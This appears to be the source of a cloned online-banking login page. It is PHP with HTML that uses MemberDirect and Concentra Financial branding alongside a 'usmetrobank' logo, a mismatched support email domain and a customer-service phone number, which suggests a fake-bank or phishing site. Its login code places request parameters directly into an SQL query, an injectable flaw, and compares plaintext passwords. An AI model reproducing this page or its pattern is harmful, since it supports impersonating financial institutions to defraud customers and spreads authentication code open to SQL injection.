...

{
	...
	$ipin=$_REQUEST['password'];	

	//echo "select * from act_holder_details where `user_id`='".$user_id."' AND `cust_password`='".$ipin."'";

	$sql=mysql_query("select * from act_holder_details where `user_id`='".$user_id."' AND `cust_password`='".$ipin."'");
$rows=mysql_num_rows($sql);
	while($dt = mysql_fetch_array($sql)) {
         	$email=$dt["cust_mail"];
         	$cust_name=$dt["cust_name"];
         	$account=$dt["account_status"];
         	$message=$dt["message"];
         	if($message=="")
         	{
         		$message="Account in review please contact customer service on +1 41 5915 3513";
         	}
           }
     // echo $email;
	if($rows>0)
...
window.location = "customer_ld.php"
	...
	/// echo "Please Check Your UserID And IPIN";exit;
...
<title>Login&nbsp;-&nbsp;MemberDirect&#174;</title>
...
<body class="Login">
	<div class="md md6 PFM">
		...
		<div class="outerHeader" id="PageHeader">
			<div class="header">
				<h1 class="logo">
					<a href="index.php" title="Concentra Financial">
					<img class="onlyScreen" src="../../../../png/usmetrobank_logo_small.png" alt="Concentra Financial"/></a>
				</h1>
				<ul class="skip nav">
...
<li class="link0 even notcurrent"><a href="https://www6.memberdirect.net/brand/celero_saskcentralCF/Content/?action=goto&amp;fromUsecase=Logon&amp;fromStep=Step1" id="NavigateContact" title="Contact Us" target="_self" >Contact Us</a></li>
...
<div id="loginAuth" class="jsDisabled">
	...
	Please login by entering your User ID and Personal Identification  Number (PIN).<br><br>
	If you have forgotten your Personal Identification  Number (PIN) or do not have one, please contact your credit union.<br><br>
	Our Enhanced Security feature helps protect your privacy when using a shared or public computer. Select <strong>Help</strong> to find out more.
	</p></div>
...
<SCRIPT LANGUAGE="JAVASCRIPT">
 <!--
        ...
        tmpcookie = "md5_test_cookie";
        document.cookie = "md5testcookie=" + tmpcookie + "; expires=" + exp.toGMTString()+ "; path=/";
        document.cookie = "md5testcookie=" + tmpcookie + "; path=/";
        if ( document.cookie.indexOf( tmpcookie, 0 ) < 0 )
        {
             document.write("<font color=red>We have detected that your browser is not set to accept cookies.  Please verify that you have cookies enabled in your browser.</font>");
        }
 //-->
</SCRIPT>
...
<?php
    ...
    { 
          ...
          if($loginwrong==1)
          {
          	$message="Please check User id or password.Wrong Login Details";
          	   echo '<p style="color:red">'.$message.'</p>';
          }
    	?>
...
<input type="hidden" class="hidden" name="branch" id="branch" value="000">
...
<div class="required pac">
    <label
        for="pac"
        title="Enter your Personal Access Code here.">
...
<div class="formActions">
	<ul>
		<li><input type="submit" title="Login to Online Banking" name="Signon" id="Signon" value="Signon" class="submit"/></li>
...
<div class="warning">
    <p>To log in to online banking, you must have JavaScript and cookies enabled.</p>
		...
		<p>For 24 hour Technical Assistance Email <a href="mailto:privatebanking@enizbnkas.com" target="_blank">Technical Support</a>.</p>
		</div>
